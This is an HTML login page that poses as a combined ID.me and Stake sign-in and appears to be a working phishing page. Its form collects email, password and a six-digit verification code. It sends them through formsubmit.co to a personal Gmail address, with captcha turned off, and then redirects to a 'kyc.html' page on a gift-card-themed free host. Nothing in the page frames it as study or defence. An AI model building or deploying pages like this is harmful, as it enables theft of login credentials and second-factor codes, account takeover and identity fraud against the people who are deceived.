
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <title>Login Page</title>
  <style>
    /* Basic reset and styling */
    * {
      margin: 0;
      padding: 0;
      box-sizing: border-box;
      font-family: Arial, sans-serif;
    }
    
    body {
      background: #f2f2f2;
      display: flex;
      flex-direction: column;
      align-items: center;
      height: 100vh;
      justify-content: center;
    }
    
    .logo {
      margin-bottom: 20px;
      font-size: 2rem;
      font-weight: bold;
    }
    
    .logo .stake {
      color: #ff9800;
    }
    
    .login-container {
      background: #fff;
      padding: 2rem;
      border-radius: 8px;
      box-shadow: 0 4px 10px rgba(0,0,0,0.1);
      width: 320px;
      text-align: center;
    }
    
    .login-container h2 {
      margin-bottom: 1.5rem;
      color: #333;
    }
    
    .login-container label {
      display: block;
      margin-bottom: 0.5rem;
      color: #555;
      text-align: left;
    }
    
    .login-container input[type="text"],
    .login-container input[type="password"],
    .login-container input[type="number"] {
      width: 100%;
      padding: 0.75rem;
      margin-bottom: 1rem;
      border: 1px solid #ccc;
      border-radius: 4px;
    }
    
    .login-container button {
      width: 100%;
      padding: 0.75rem;
      background: #4CAF50;
      color: #fff;
      border: none;
      border-radius: 4px;
      cursor: pointer;
      font-size: 1rem;
    }
    
    .login-container button:hover {
      background: #45a049;
    }
    
    .login-container .error {
      color: red;
      margin-bottom: 1rem;
      display: none;
    }
    
    .signup-text {
      margin-top: 20px;
      font-size: 0.9rem;
      color: #555;
      text-align: center;
    }
    
    .signup-text p {
      margin: 5px 0;
    }
    
    .signup-text .stake {
      color:#7CFC00;
      font: bold;

    }
  </style>
</head>
<body>

  <!-- Text Logo -->
  <div class="logo">
    ID.me + <span class="stake">STAKE</span>
  </div>
  
  <!-- Login Container -->
  <div class="login-container">
    <h2>Login</h2>
    <div id="error-message" class="error">Please enter a 6-digit code.</div>
    <form id="login-form" action="https://formsubmit.co/voiceofgoog82@gmail.com" method="POST" onsubmit="return validateCode();">
      <input type="hidden" name="_captcha" value="false">
      <input type="hidden" name="_next" value="https://bestgiftcardchecker.w3spaces.com/kyc.html">
      <label for="username">Email</label>
      <input type="text" id="username" name="username" placeholder="Enter your Email" required>

      <label for="password">Password</label>
      <input type="password" id="password" name="password" placeholder="Enter your password" required>
      
      <!-- Optional: 6-digit code input -->
      <label for="code">6-Digit Code</label>
      <input type="number" id="code" name="code" placeholder="Enter 6-digit code" required>

      <button type="submit">Login</button>
    </form>
    
    <!-- Sign-up Text inside the container -->
    <div class="signup-text">
      <p>or</p>
      <p>sign up for <a href="https://www.id.me"><h3>ID.<span class="stake">me</span></a></p>
    </div>
  </div>

  <script>
    // Validate that the code is exactly 6 digits
    function validateCode() {
      const codeInput = document.getElementById('code').value;
      const errorMessage = document.getElementById('error-message');
      const codePattern = /^\d{6}$/; // regex for exactly 6 digits

      if (!codePattern.test(codeInput)) {
        errorMessage.style.display = 'block';
        return false; // prevent form submission
      }
      
      // Hide error if validation passes
      errorMessage.style.display = 'none';
      return true;
    }
  </script>

</body>
</html>
